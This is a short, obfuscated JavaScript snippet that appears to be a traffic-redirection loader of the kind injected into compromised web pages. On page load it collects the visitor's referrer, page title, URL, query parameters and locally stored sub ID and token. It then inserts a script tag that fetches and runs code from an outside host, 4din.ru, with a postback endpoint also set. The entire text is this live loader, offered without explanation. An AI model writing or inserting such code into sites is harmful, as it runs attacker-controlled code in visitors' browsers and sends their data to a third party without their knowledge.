 (function() {
    var name = '_HwnykND6CMdTXd8f';
    if (!window._HwnykND6CMdTXd8f) {
        window._HwnykND6CMdTXd8f = {
            unique: false,
            ttl: 86400,
            R_PATH: 'https://4din.ru/25HDxDm4',
            P_PATH: 'https://4din.ru/7a3be7b/postback',
        };
    }
    const _BGzpYq3zvh3vPS15 = localStorage.getItem('config');
    if (typeof _BGzpYq3zvh3vPS15 !== 'undefined' && _BGzpYq3zvh3vPS15 !== null) {
        var _g96vmG5TS5Kpbqdc = JSON.parse(_BGzpYq3zvh3vPS15);
        var _v2kj8gkyGWCHnTTG = Math.round(+new Date()/1000);
        if (_g96vmG5TS5Kpbqdc.created_at + window._HwnykND6CMdTXd8f.ttl < _v2kj8gkyGWCHnTTG) {
            localStorage.removeItem('subId');
            localStorage.removeItem('token');
            localStorage.removeItem('config');
        }
    }
    var _sTfbHMFJX42yB6KP = localStorage.getItem('subId');
    var _pTh2bKdtpdg6Sb2j = localStorage.getItem('token');
    var _LPnPC1vGhk7w7kyB = '?return=js.client';
        _LPnPC1vGhk7w7kyB += '&' + decodeURIComponent(window.location.search.replace('?', ''));
        _LPnPC1vGhk7w7kyB += '&se_referrer=' + encodeURIComponent(document.referrer);
        _LPnPC1vGhk7w7kyB += '&default_keyword=' + encodeURIComponent(document.title);
        _LPnPC1vGhk7w7kyB += '&landing_url=' + encodeURIComponent(document.location.hostname + document.location.pathname);
        _LPnPC1vGhk7w7kyB += '&name=' + encodeURIComponent(name);
        _LPnPC1vGhk7w7kyB += '&host=' + encodeURIComponent(window._HwnykND6CMdTXd8f.R_PATH);
    if (typeof _sTfbHMFJX42yB6KP !== 'undefined' && _sTfbHMFJX42yB6KP && window._HwnykND6CMdTXd8f.unique) {
        _LPnPC1vGhk7w7kyB += '&sub_id=' + encodeURIComponent(_sTfbHMFJX42yB6KP);
    }
    if (typeof _pTh2bKdtpdg6Sb2j !== 'undefined' && _pTh2bKdtpdg6Sb2j && window._HwnykND6CMdTXd8f.unique) {
        _LPnPC1vGhk7w7kyB += '&token=' + encodeURIComponent(_pTh2bKdtpdg6Sb2j);
    }
    var a = document.createElement('script');
        a.type = 'application/javascript';
        a.src = window._HwnykND6CMdTXd8f.R_PATH + _LPnPC1vGhk7w7kyB;
    var s = document.getElementsByTagName('script')[0];
    s.parentNode.insertBefore(a, s)
    })();
